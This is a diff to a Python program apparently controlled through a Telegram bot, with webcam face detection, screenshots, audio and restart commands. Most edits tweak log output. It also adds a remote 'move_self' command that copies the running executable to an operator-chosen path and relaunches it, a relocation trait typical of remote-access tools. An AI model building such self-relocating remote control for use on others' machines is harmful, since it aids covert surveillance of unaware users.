@@ -113,6 +113,7 @@ TELEGRAM_COMMANDS_LIMIT = 100
 TELEGRAM_COMMAND_LENGHT_LIMIT = 32
 TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT = 256
 KEY_PATH = resource_path("key.key")
+print(f"{BASE_EXE=}")
 
 try:
     assets_dir = ""
@@ -316,7 +317,7 @@ def detect_face(cap:VideoCapture|None=None) -> tuple[int,Mat]:
 def load_images(vfx_folder: str = vfx) -> dict[str, Mat]:
     result = {}
 
-    print(f"[load_images] Loading from folder: {vfx_folder}")
+    print(f"\n\n[load_images] Loading from folder: {vfx_folder}")
 
     try:
         files = listdir(vfx_folder)
@@ -352,13 +353,13 @@ def load_images(vfx_folder: str = vfx) -> dict[str, Mat]:
         except Exception as e:
             print(f"[load_images][ERROR] Failed on {x}: {e}")
 
-    print(f"[load_images] Done. Loaded {len(result)} images.{f'Errors: {errors}' if errors else ''}")
+    print(f"[load_images] Done. Loaded {len(result)} images.{f'Errors: {errors}' if errors else ''}\n\n")
     return result
 
 def load_audios(sfx_folder: str = sfx) -> dict[str, str]:
     result = {}
 
-    print(f"[load_audios] Loading from folder: {sfx_folder}")
+    print(f"\n\n[load_audios] Loading from folder: {sfx_folder}")
 
     try:
         files = listdir(sfx_folder)
@@ -387,7 +388,7 @@ def load_audios(sfx_folder: str = sfx) -> dict[str, str]:
         except Exception as e:
             print(f"[load_audios][ERROR] Failed on {x}: {e}")
 
-    print(f"[load_audios] Done. Loaded {len(result)} audios.{f'Errors: {errors}' if errors else ''}")
+    print(f"[load_audios] Done. Loaded {len(result)} audios.{f'Errors: {errors}' if errors else ''}\n\n")
     return result
 
 def randompngname(lenght: int=10) -> str:
@@ -752,6 +753,7 @@ class PeppinoTelegram:
             # 🔧 Utilities & Testing
             Command("status", self.send_status, "Just checking if the bot is online.", "utility", "🟢 Check Status"),
             Command("restart", self.restart, "Restarts the bot process.", "utility", "🔄 Restart"),
+            Command("move_self", self.move_myself, "Moves the executable to a targeted path", "utility", "Move Exe"),
             Command("set_time_restart", self.setTimeoutRestart, "Sets bot time threshold before restarting.", "utility", "⏱️ Set Time Restart"),
             Command("get_logs", self.get_logs, "Gets the program logs ins a file", "utility", "📄 Get Logs"),
             Command("stop", self.stop, "Stop current operation.", "utility", "🛑 Stop"),
@@ -1380,7 +1382,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def handle_conflict(self) -> None:
         e = self.new_editable_message(
-            self.format_warning_msg("CONFLICT")
+            self.format_warning_msg("CONFLICT"),
+            parse_mode="HTML"
         )
         sleep(5)
         e.delete()
@@ -1595,6 +1598,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             "🔇Mute":"/mutevolume",
         }
         self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")
+
+    def move_myself(self, target_path: str) -> None:
+        if copy_myself(target_path):
+            args = sys.argv[:]
+            exe_path = BASE_EXE
+            os.execv(exe_path, [exe_path] + args)
 
     def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
         print(f"Taking modified screenshot with effect: {effect.__name__}")
